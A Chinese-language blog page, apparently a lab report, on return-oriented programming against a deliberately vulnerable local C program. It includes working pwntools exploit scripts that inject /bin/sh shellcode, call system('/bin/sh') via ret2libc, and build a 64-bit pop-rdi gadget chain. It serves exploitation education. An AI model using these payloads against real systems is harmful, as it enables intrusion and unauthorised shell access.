<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Rop | Reus09&#39;s Blog</title>
<meta name="keywords" content="rop">
<meta name="description" content="pwn_rop 调试 0x01 实验目的 1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcode地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。 2.针对实验二的32位环境和64位环境，通过调试分析，完成实">
<meta name="author" content="Reus09">
<link rel="canonical" href="https://reus09.github.io/posts/tech/rop/">
<meta name="google-site-verification" content="XYZabc">
<link crossorigin="anonymous" href="/assets/css/stylesheet.678b5c47efa744d2e0dd0d61101075e6aecdc9a0631e7ad8538f4ec0cca79273.css" integrity="sha256-Z4tcR&#43;&#43;nRNLg3Q1hEBB15q7NyaBjHnrYU49OwMynknM=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Rop" />
<meta property="og:description" content="pwn_rop 调试 0x01 实验目的 1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcode地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。 2.针对实验二的32位环境和64位环境，通过调试分析，完成实" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://reus09.github.io/posts/tech/rop/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-11-03T22:11:40+00:00" />
<meta property="article:modified_time" content="2022-09-11T16:09:37+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Rop"/>
<meta name="twitter:description" content="pwn_rop 调试 0x01 实验目的 1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcode地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。 2.针对实验二的32位环境和64位环境，通过调试分析，完成实"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "📚文章",
      "item": "https://reus09.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "👨🏻‍💻技术",
      "item": "https://reus09.github.io/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Rop",
      "item": "https://reus09.github.io/posts/tech/rop/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Rop",
  "name": "Rop",
  "description": "pwn_rop 调试 0x01 实验目的 1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcode地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。 2.针对实验二的32位环境和64位环境，通过调试分析，完成实",
  "keywords": [
    "rop"
  ],
  "articleBody": "pwn_rop 调试 0x01 实验目的 1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcode地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。 2.针对实验二的32位环境和64位环境，通过调试分析，完成实际rop2.py和rop3.py （预留有空白和错误之处），最终拿到shell权限。相关详细分析过程写入报告 0x02 实验环境 Ubuntu 20 gcc 版本 工具 pwndbg ROPgadget pwntools visual studio code 通过vs code 的ssh 远程连接服务器ubuntu，并且远程调试程序。 0x03 实验前提知识 ROP的全称为 Return-oriented Programming（返回导向编程\n绕过可执行空间保护、代码签名等安全保护机制，执行恶意代码 通过控制被调用的堆栈，对程序的控制流进行劫持，完成某些特定功能 Shellcode写在栈中 未提供堆栈的保护措施，直接将shellcode写入栈中，并将函数的返回地址覆写为shellcode的地址。\n返回地址覆盖为shellcode，从而实现执行shellcode。 Ret2libc 加入了DEP（Data Execution Prevention）和NX（No execute）保护之后，拒绝执行堆栈上的任何代码。\nret2libc是ROP技术的一种，通过将返回地址覆写为libc中的函数绕过NX保护。\n我们知道，操作系统通常使用动态链接的方法来提高程序运行的效率。那么在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载。也就是控制执行 libc（对应版本） 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)（或者execve(\"/bin/sh\",NULL,NULL)），故而此时我们需要知道 system 函数的地址。\ngadget 64位处理器的发展，改变了函数的调用约定，要求函数的前6个参数保存在寄存器中，如果还有更多的参数才会保存在栈中。 想继续给函数传递参数,将不能通过简单操作栈来操作函数，还需要操作寄存器。由此ret2libc变的难以成功。 gadget是从可执行文件或共享库中获取的以ret为结尾的指令序列。这种ROP技术寻找能够将栈中的值pop到寄存器的指令片段，由此构造函数参数。 ASLR地址随机化 开启地址随机化\n1 2 3 4 5 # 查看ASLR是否开启 cat /proc/sys/kernel/randomize_va_space # 关闭ASLR sudo su echo 0 \u003e /proc/sys/kernel/randomize_va_space 系统转储 dump core 1 2 3 4 5 6 7 # 查看是否开启： ulimit -c （如果是0就是关着的） # 开启转储 ulimit -c unlimited # 设置转储文件位置为/tmp文件夹下面 sudo su sudo sh -c 'echo \"/tmp/core.%t\" \u003e /proc/sys/kernel/core_pattern' Ubuntu 保持堆栈平衡 在Ubuntu18以上的版本，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。因为在Ubuntu18下system调用时要求地址和16字节对齐，如果没有栈对齐的话，程序就直接crash了。\n因为命令:\n1 2 3 .text:000000000004F2F1 movhps xmm0, [rsp+198h+var_190] .text:000000000004F2F6 movaps [rsp+198h+var_158], xmm0 ; here .text:000000000004F2FB call sigaction 主要原因是0x4F2F6处的movaps [rsp+198h+var_158], xmm0指令要求rsp+198h+var_158的值是对齐16byte（0x10），否则会直接触发中断从而crash。\n这些都是在Ubuntu 18 版本以上的才存在。\n栈的字节对齐，实际是指栈顶指针必须是16字节的整数倍。栈对齐使得在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。\n但是实际上，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器，在执行某些实现多媒体操作的SSE指令时，如果数据没有对齐，将无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。\n因此，任何针对x86_64处理器的编译器和运行时系统都必须保证， 它们分配内存将来可能会被SSE指令使用，所以必须是16字节对齐的，这也就形成了一种标准：\n任何内存分配函数（alloca, malloc, calloc或realloc）生成的块的起始地址都必须是16的倍数。 大多数函数的栈帧的边界都必须是16字节的倍数。 如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（rsp）也必须是16的倍数。\n实验源码 1 2 3 4 5 6 7 8 9 10 11 12 13 #include void vuln() { char buf[128]; read(0,buf,256); } int main() { vuln(); write(1,\"hello rop\\n\",10); } 分析程序漏洞 Vuln()函数中，buf数组的大小是128字节，但是在read时最多可以读入256字节，容易造成缓冲区溢出，利用这个漏洞对程序流进行劫持，执行构造好的payload。\n具体的思路：把payload写入buf数组中，并利用缓冲区溢出漏洞，将返回地址修改为buf数组的地址，vuln()函数返回之后，就会到buf数组中执行shellcode\n可以利用pwntools有一个shellcraft模块可以实现shellcde，其中其中**shellcraft.sh()**就是生成执行/bin/sh的shellcode。\n可以用asm()将shellcode 转换为机器码\n0x04 实验过程 rop1_gdb 编译rop1.c，关闭栈保护和NX保护，在32位环境下，编译生成rop1\n这里我们想实现的是通过gdb 调试rop1获得真正的buf地址，然后向里面输入我们精心构造好的shellcode,将返回地址覆盖为我们找到的真实buf地址。\n这里解释一下为什么gdb调试中产生的buf地址和真正执行程序的地址原因\n正常程序运行时，会将环境变量字符串数组和命令行参数字符串数组存放在栈顶，而程序使用的局部变量等数据则位于这些字符串数组之后。环境变量字符串数组记录了诸如当前用户名、终端类型、搜索路径等环境信息。程序直接运行时，程序进程继承的是运行其的 shell 的环境变量，而程序通过 gdb 运行时，程序进程继承的是 gdb 的环境变量，这两者存在不同，从而会造成位于栈上的局部变量的地址发生改变。用户可在 gdb 中运行 show environment 命令获得环境变量参数。、\n较之程序直接运行，位于栈顶的环境变量主要有以下变化\n环境变量的内容发生改变，在程序直接运行时，_ 变量存放的是程序的执行路径，而通过 gdb 运行程序时，_ 变量存放的是 gdb 的执行路径。 通过 gdb 运行的调试程序继承了 gdb 的环境变量，其中包含新加入的环境变量 LINES 和 COLUMNS。 位于栈上的参数列表也可能不同，当用户通过 ./rop1 直接在shell 中运行程序时，位于参数数组的第一项 argv[0] 内容为”./rop1” ,而用户通过 gdb 运行 hello 程序时，程序的参数列表的第一项 argv[0] 的值为该程序的绝对路径”/home/reus09/test/pwn/2_rop/rop1”，这也会造成程序运行时局部变量地址的差异。建议终端环境下使用绝对路径运行程序，避免该差异。 这里有三种解决方案\n通过gdb来attach 一个正在运行的程序，其地址和正在运行的地址是一致的\n在gdb调试过程中，对传递给进程的环境变量进行操作和修改\ngdb 可通过 wrapper 函数运行调试程序。当设置好 wrapper 程序后，gdb 会以 exec wrapper hello 的 shell 命令的形式启动调试程序 Hello，wrapper程序首先运行并最终启动调试进程，之后由 gdb 对调试进程进行控制。通过 wrapper 程序，即可控制传递给调试进程的环境变量。\n1 2 3 set exec-wrapper wrapper　//设置 wrapper 程序为 wrapper show exec-wrapper //显示当前的 wrapper 程序 unset exec-wrapper　//取消对 wrapper 程序的设置 利用内核转储获取真实地址。\n使用命令ulimit -c unlimited启动内核转储，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。 然后使用命令gdb filename core即可调试，获得真实地址。 第一种方案 通过gdb来attach 一个正在运行的程序 运行rop1程序 利用ps -ax 查看所有进程，发现rop1运行的进程pid 为 130896，将其直接attach 在vuln地方设置断点，并且执行程序，进入到vuln函数里面 一路n 单步步过，跳到read函数上面 发现buf地址为0xffffd1a0，此时的buf地址即为真实地址 第二种方案 gdb调试过程中，去除环境变量\n输入命令gdb rop1\n1 set exec-wrapper env -u COLUMNS -u LINES -u _ //在 gdb 中设置 wrapper 程序 然后在vuln处设置断点，运行程序后，单步跳过一直到read部分\n发现此时的buf首地址仍然为 0xffffd1a0\nshellcode 执行部分 上述两种方案确定了直接执行rop1程序的时候buf的真正首地址0xffffd1a0\n但是由于pwntools 自带的 python环境，会影响rop1程序运行的buf地址，因此这个真实地址是不能够在shellcode中直接作为返回地址执行的。\n因为这里需要用gdb来实现shellcode 的调试，所以我们需要加入gdb的环境，并设置一些软断点来保证gdb中可以执行到shellcode\n这里需要用到core报错的部分，同样我们也需要管道来输入我们精心构造好的shellcode\n这里我们需要确定一下buf数组的长度，以及返回长度的位数，以便于确定找到返回地址从而覆盖掉它。\n这里我们采用在IDA里面查看一下我们需要填充多少字符\nIDA查看buf数组的存储情况 由此确定buf首地址到esp 的长度为 0x88,然后到返回地址的长度为0x04,因此算上我们构造的shellcode，我们需要填充0x8c个字符 然后我们这里以一个错误的地址0xdeadbeef来产生报错，从而得到在gdb中buf的可用地址\n我们通过pwntools产生shellcode将其保存为deadbeef，其最后的地址会被覆盖为0xdeadbeef\n脚本如下\n1 2 3 4 5 6 7 8 9 from pwn import * p = process('./rop1') shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b'a')+p32(shellcode_addr) print(payload) with open(\"deadbeef\",'wb') as f: f.write(payload) 可以看到我们精心构造的shellcode已经存储到文件deadbeef里面\n在gdb 中调试\n命令r \u003c deadbeef，执行过程中通过管道输入我们构造好的shellcode 发现寄存器ECX存储的是shellcode存储的首地址 此地址0xffffd170即为我们gdb调试过程中可以利用的buf真实地址 下面利用上面同样的方法，构造好我们需要的产生shellcode的文件\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process('./rop1') shellcode = asm(shellcraft.sh()) shellcode_addr = 0xffffd170 payload = shellcode.ljust(0x8c,b'a')+p32(shellcode_addr) print(payload) with open(\"gdb_with_payload\",'wb') as f: f.write(payload) 我们可以利用的shellcode文件即已经构造完成。\n下面在gdb中执行我们的shellcode\n这里需要做一些前置工作，因为我们想要设置一些软断点。否则输入shellcode后进程会被直接杀死，程序只会一闪而过。\n这个软断点的意思是，跟踪我们输入的文件，文件输入完毕后，设置断点\n命令如下\n1 2 3 4 5 set detach-on-fork on set follow-fork-mode child set breakpoint pending on b_start 首先告诉 gdb 跟踪子进程；然后设置set breakpoint pending on是为了在设置断点时让 gdb 不强制在对符号下断点时就需要固定地址，这样在b _start时就会 pending 而不是报错；最后再连接到父进程以及加载子进程的符号。 直接gdb rop1进入命令，然后输入上述设置子进程的命令\n然后输入命令r \u003c gdb_with_payload，执行的时候通过管道符载入数据gdb_with_payload，这里覆盖返回地址的是我们精心构造的适合gdb环境的buf地址(注意，这里的buf地址并不是程序直接运行产生的buf地址) 连续的r命令 这里通过一个子进程的调度从而运行了我们的shellcode，很明显可以看到这里出现了我们的输入命令 验证是否拿到shell\n输入命令ls 输入命令whoami 这样我们就实现了通过gdb调试直接 控制shell，但是由于设置断点的子进程输入命令后，直接被附近到当前的命令，故每次调试只能使用一次。\nrop1_py 这里是使用pwntools工具来实现拿到shell,pwntools实现的连接持久，这里同样也是我们上述提到的第三种方案利用内核转储获取真实地址(即利用 dump core 来实现获取buf地址，这个buf地址是受python环境影响的)\n首先构造虚假的地址0xdeadbeef来使程序崩溃产生core\n脚本如下\n1 2 3 4 5 6 7 from pwn import * p = process('./rop1') shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b'a')+p32(shellcode_addr) p.sendline(payload) p.interactive() 在终端执行该脚本\n通过前后ls命令可以很清晰的看到，执行脚本之后程序崩溃，产生了core报错文件 执行命令gdb ./rop1 core来调试该core\n此时esp指针位于返回地址的下一个位置，因此buf的地址是esp-0x4-0x8c，即地址esp-0x90 通过命令x/s $esp-0x90查看 发现地址0xffffd1c0存储的果然是shellcode存放的地方 于是直接将返回地址修改为0xffffd1c0\n在终端执行exp\n可以看到，我们已经拿到了shell 最终exp 如下\n1 2 3 4 5 6 7 from pwn import * p = process('./rop1') shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b'a')+p32(shellcode_addr) p.sendline(payload) p.interactive() rop2_32 编译rop1.c，只开启Canary栈保护，在32位环境下，编译生成rop2\n可以看到NX保护已经开启，程序为32位程序\n查看rop2进程栈的权限为rw-p，不可执行\n栈上的程序不能运行，即我们不能在栈上执行shellcode，但在程序中用到了libc库中的read和printf函数，libc.so中保存了大量的可用函数，考虑调用system(\"/bin/sh\")来绕过NX保护获取shell\n根据ROP的原理，不难发现，我们可以将返回地址覆盖为我们要调用的system函数地址，然后在它下面写入system函数需要返回的地址以及它传入的参数/bin/sh\n示意图如下 这里首先确定一下buf首地址到返回地址中间的差距，以便确定填充多少字符来覆盖返回地址。\n同样用IDA 查看 rop2 中 buf的结构 发现需要填充的字符为0x88 + 0x04 为 0x8c 因为我们环境已经关闭了地址随机化，因此system和/bin/sh的地址并不会随程序运行而改变。\n接下来寻找system的地址\n我们可以在gdb 调试过程中 直接 调用命令print system 来查看system函数地址 因此system函数地址为0xf7e17830 接下来需要我们需要的字符串/bin/sh的存储地址\n这里我们需要调试gdb过程中，用到vmmap 命令来查看libc.so的起始位置，在其中间查找到存储/bin/sh的地址 根据起始地址和结束地址，查找/bin/sh的位置 显然/bin/sh存放的地址为0xf7f64352 我们调用system后的返回地址因为我们不需要返回，所以直接填充0xdeadbeef即可\n在终端下调用exp\n很明显可以看到我们已经拿到了shell 最终exp:\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process('./rop2') #gdb.attach(p,'b vuln') sys_addr=0xf7e17830 binsh_addr=0xf7f64352 payload = b'a'*0x8c + p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr) p.sendline(payload) p.interactive() rop3_64 编译rop1.c，只开启Canary栈保护，关闭no-pie在64位环境下，编译生成rop3\n这里同样关闭了NX保护,同时编译产生的程序为64位 并不能在栈上直接写shellcode，考虑同样构造ROP链的形式来拿到shell，但是64位程序不同于32位程序，参数存放在寄存器中，多于6个参数才会放在栈上。\n图例\n关于漏洞利用\n由于参数不会直接放在栈上，需要寻找类似于pop rdi；ret的gadget，将参数从栈中弹出到rdi寄存器后，返回到返回地址处继续执行。本例子在栈中事先压入参数/bin/sh地址和system地址。 图例即为 ubuntu20 字节对齐 首先查看一下要从buf数组到返回地址 我们需要覆盖多少字节\n这里同样使用IDA来查看程序 发现buf数组长度为0x80，返回地址长度为0x08，故我们需要覆盖的长度为0x88 找到存在pop rdi;ret的指令地址\n这里使用ROPgadget 工具 首先使用命令ldd rop3查看rop3使用的libc的版本，找到对应的版本，然后就在libc库中查到我们需要的pop rdi;ret 这里我们就拿到了pop|rdi 相对于libc的偏移地址0x0000000000026b72 找到system和/bin/sh的地址\n这里的方法和找rop2中的方法一样\n在gdb调试过程中，分别用print system 和vmmap 查找地址\n可以看到system的存储地址为0x7ffff7e22410\nvmmap 和find命令查找/bin/sh地址\n可以看到/bin/sh的地址为0x7ffff7f845aa\n/usr/lib/x86_64-linux-gnu/libc-2.31.so的起始地址为0x7ffff7dcd000\n按道理这个时候我们已经将地址一一对应填入即可拿到shellcode，但是由于我们机器使用的为ubuntu 20,在ubuntu18版本以上的系统，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。因为在Ubuntu18下system调用时要求地址和16字节对齐，如果没有栈对齐的话，程序就直接crash了。\n我们这里填充的字符长度为0x88，因此我们需要在加入0x08个字符来平衡栈，这种情况下如加入新的字节不能影响我们ROP链的执行，因此我们该字符存储因改为ret指令类似的不影响逻辑的指令。\n我们同样根据ROPgadget来拿到对应的ret存放的地址\n我们直接查看位于libc.so中的程序中一个存储ret指令的地址\n命令 ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \"ret\"\n因为这里相对偏移基于libc.so的首地址为0x0000000000025679\n所以ret的实际地址为0x7ffff7dcd000+0x0000000000025679\n将填充好的地址 写入exp中，在终端执行exp\n最终exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * p = process('./rop3') ret_addr= 0x7ffff7dcd000+0x0000000000025679 sys_addr= 0x7ffff7e22410 binsh_addr=0x7ffff7f845aa pr_addr = 0x7ffff7dcd000 + 0x26b72 payload = b'a'*0x88+ p64(ret_addr)+ p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() Ubuntu16 中正常没有字节对齐 ubuntu版本\n找到存在pop rdi;ret的指令地址\n相对偏移地址为0x0000000000021112 system地址\nsystem 地址为 0x7ffff7a523a0 /bin/sh地址\nlibc.so首地址0x7ffff7a0d000,/bin/sh首地址0x7ffff7b99e57 exp终端直接执行\n发现拿到shell 最终exp\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * p = process('./rop3') sys_addr= 0x7ffff7a523a0 binsh_addr=0x7ffff7b99e57 pr_addr = 0x7ffff7a0d000 + 0x21112 payload = 'a'*0x88 + p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() 0x05 实验结论 实验过程中针对实验一，分别使用了gdb直接调试得到shell和通过pwntools结合dump core得到shell两种方案，但是实际上两种方案中运用的地址并不是程序直接运行时候buf数组的地址，二者因为程序运行环境的差异，buf的地址都有差异。 同时呢，运用gdb调试shellcode，直接写入数据比较麻烦，因为shellcode读取需要字节流，这里的解决方案是利用pwntools生成的payload保存为文件，以管道的形式将其输入到gdb中。此外，在查看shellcode调试效果的时候，需要设置软断点来调用子进程，并且一次只能查看一个命令的结果，不便于持久化shell连接，但是gdb方便调试，随意设置断点，查看自己想看的东西，定位到read函数里面查看buf的地址，很方便。 python 调试呢，因为结合程序运行崩溃产生的core,在python环境下的buf地址相当明朗，借助pwntools的工具，很容易就可以构造payload，将其发送给服务器端并建立持久化的shell连接，但是调试的话不太方便，但是可以使用在pwntools里面调用gdb来实现。所以总体来说，rop1-modified.py脚本调试更为方便，功能也更为强大。 对于实验二 对于Ubuntu18 以上的版本，调试64位程序的时候，我们精心构造的payload一般要考虑字节对齐的因素，一般采用ret来进行对齐。 充分理解了ROP链的构造过程 了解了Linux下system和exec函数的用法。 ",
  "wordCount" : "7721",
  "inLanguage": "zh",
  "datePublished": "2021-11-03T22:11:40Z",
  "dateModified": "2022-09-11T16:09:37+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://reus09.github.io/posts/tech/rop/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://reus09.github.io" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://reus09.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="https://reus09.github.io/" title="主页">
                    <span>主页</span>
                </a>
            </li>
            <li>
                <a href="https://reus09.github.io/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="https://reus09.github.io/tags" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="https://reus09.github.io/archives/" title="时间轴">
                    <span>时间轴</span>
                </a>
            </li>
            <li>
                <a href="https://reus09.github.io/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://reus09.github.io">主页</a>&nbsp;»&nbsp;<a href="https://reus09.github.io/posts/">📚文章</a>&nbsp;»&nbsp;<a href="https://reus09.github.io/posts/tech/">👨🏻‍💻技术</a></div>
    <h1 class="post-title">
      Rop
    </h1>
    <div class="post-meta"><span title='2021-11-03 22:11:40 +0000 UTC'>2021-11-03</span>&nbsp;·&nbsp;16 分钟&nbsp;·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">目录</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#pwn_rop-%e8%b0%83%e8%af%95" aria-label="pwn_rop 调试">pwn_rop 调试</a><ul>
                            
                    <li>
                        <a href="#0x01-%e5%ae%9e%e9%aa%8c%e7%9b%ae%e7%9a%84" aria-label="0x01 实验目的">0x01 实验目的</a></li>
                    <li>
                        <a href="#0x02-%e5%ae%9e%e9%aa%8c%e7%8e%af%e5%a2%83" aria-label="0x02 实验环境">0x02 实验环境</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#ubuntu-20" aria-label="Ubuntu 20">Ubuntu 20</a></li>
                    <li>
                        <a href="#gcc-%e7%89%88%e6%9c%ac" aria-label="gcc 版本">gcc 版本</a></li>
                    <li>
                        <a href="#%e5%b7%a5%e5%85%b7" aria-label="工具">工具</a><ul>
                            
                    <li>
                        <a href="#pwndbg" aria-label="pwndbg">pwndbg</a></li>
                    <li>
                        <a href="#ropgadget" aria-label="ROPgadget">ROPgadget</a></li>
                    <li>
                        <a href="#pwntools" aria-label="pwntools">pwntools</a></li>
                    <li>
                        <a href="#visual-studio-code" aria-label="visual studio code">visual studio code</a></li></ul>
                    </li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#0x03-%e5%ae%9e%e9%aa%8c%e5%89%8d%e6%8f%90%e7%9f%a5%e8%af%86" aria-label="0x03 实验前提知识">0x03 实验前提知识</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#shellcode%e5%86%99%e5%9c%a8%e6%a0%88%e4%b8%ad" aria-label="Shellcode写在栈中">Shellcode写在栈中</a></li>
                    <li>
                        <a href="#ret2libc" aria-label="Ret2libc">Ret2libc</a></li>
                    <li>
                        <a href="#gadget" aria-label="gadget"><code>gadget</code></a></li>
                    <li>
                        <a href="#aslr%e5%9c%b0%e5%9d%80%e9%9a%8f%e6%9c%ba%e5%8c%96" aria-label="ASLR地址随机化">ASLR地址随机化</a></li>
                    <li>
                        <a href="#%e7%b3%bb%e7%bb%9f%e8%bd%ac%e5%82%a8-dump-core" aria-label="系统转储 dump core">系统转储 dump core</a></li>
                    <li>
                        <a href="#ubuntu-%e4%bf%9d%e6%8c%81%e5%a0%86%e6%a0%88%e5%b9%b3%e8%a1%a1" aria-label="Ubuntu 保持堆栈平衡">Ubuntu 保持堆栈平衡</a></li>
                    <li>
                        <a href="#%e5%ae%9e%e9%aa%8c%e6%ba%90%e7%a0%81" aria-label="实验源码">实验源码</a></li>
                    <li>
                        <a href="#%e5%88%86%e6%9e%90%e7%a8%8b%e5%ba%8f%e6%bc%8f%e6%b4%9e" aria-label="分析程序漏洞">分析程序漏洞</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#0x04-%e5%ae%9e%e9%aa%8c%e8%bf%87%e7%a8%8b" aria-label="0x04 实验过程">0x04 实验过程</a><ul>
                            
                    <li>
                        <a href="#rop1_gdb" aria-label="rop1_gdb">rop1_gdb</a><ul>
                            
                    <li>
                        <a href="#%e7%ac%ac%e4%b8%80%e7%a7%8d%e6%96%b9%e6%a1%88" aria-label="第一种方案">第一种方案</a></li>
                    <li>
                        <a href="#%e7%ac%ac%e4%ba%8c%e7%a7%8d%e6%96%b9%e6%a1%88" aria-label="第二种方案">第二种方案</a></li>
                    <li>
                        <a href="#shellcode-%e6%89%a7%e8%a1%8c%e9%83%a8%e5%88%86" aria-label="shellcode 执行部分">shellcode 执行部分</a></li></ul>
                    </li>
                    <li>
                        <a href="#rop1_py" aria-label="rop1_py">rop1_py</a></li>
                    <li>
                        <a href="#rop2_32" aria-label="rop2_32">rop2_32</a></li>
                    <li>
                        <a href="#rop3_64" aria-label="rop3_64">rop3_64</a><ul>
                            
                    <li>
                        <a href="#ubuntu20-%e5%ad%97%e8%8a%82%e5%af%b9%e9%bd%90" aria-label="ubuntu20 字节对齐">ubuntu20 字节对齐</a></li>
                    <li>
